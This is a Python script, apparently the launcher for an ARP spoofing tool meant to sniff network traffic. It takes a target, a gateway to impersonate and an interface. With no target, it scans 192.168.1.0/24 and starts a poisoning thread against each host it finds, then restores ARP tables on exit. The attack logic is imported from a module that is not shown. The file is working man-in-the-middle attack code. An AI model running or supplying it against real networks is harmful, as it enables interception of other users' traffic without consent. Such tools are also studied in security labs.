import argparse
import signal
import threading
import questionary
import sys
import scapy.all as scapy

from ArpPoisoning import ArpSpoofing

spoofers = []  # referencias globales para poder restaurar al salir


def ctrl_c(sig, frame):
    print("\n[!] Interruption detected. Restoring ARP tables and exiting...")
    for s in spoofers:
        s.running = False
        try:
            s.restore()
        except Exception as e:
            print(f"[-] Error restoring {s.target_ip}: {e}")
    sys.exit(0)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, ctrl_c)

    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(
            description="ARP Spoofing Tool to sniff network traffic."
        )
        parser.add_argument(
            "-t",
            "--target",
            required=True,
            help="Target IP address (deja vacío o usa comillas '' para atacar toda la red).",
        )
        parser.add_argument(
            "-s", "--spoof", required=True, help="Spoofed IP address (e.g., Gateway)."
        )
        parser.add_argument(
            "-i", "--interface", required=True, help="Network interface (e.g., eth0)."
        )

        args = parser.parse_args()
        target = args.target
        spoof = args.spoof
        inter = args.interface
    else:
        choices_all = [iface.name for iface in scapy.get_working_ifaces()]
        target = questionary.text(
            "What's your target IP? (déjalo vacío para atacar toda la red)"
        ).ask()
        spoof = questionary.text("What's your gateway/IP to spoof?").ask()
        inter = questionary.select("Select the interface:", choices=choices_all).ask()

    if target.strip() == "":
        print("[*] No se especificó target, escaneando la red local...")
        arp_request = scapy.ARP(pdst="192.168.1.0/24")
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request
        answered, unanswered = scapy.srp(packet, timeout=1, iface=inter, verbose=False)

        threads = []
        for sent, received in answered:
            host_ip = received.psrc

            if host_ip == spoof:
                continue

            spoofer = ArpSpoofing(target_ip=host_ip, spoof_ip=spoof, interface=inter)
            spoofers.append(spoofer)

            t = threading.Thread(target=spoofer.run, daemon=True)
            threads.append(t)
            t.start()
            print(f"\033[32m[+]\033[0m Hilo de spoofing iniciado para {host_ip}")

        if not threads:
            print("[!] No se encontraron hosts en la red.")
            sys.exit(0)

        for t in threads:
            t.join()

    else:
        spoofer = ArpSpoofing(target_ip=target, spoof_ip=spoof, interface=inter)
        spoofers.append(spoofer)
        spoofer.run()
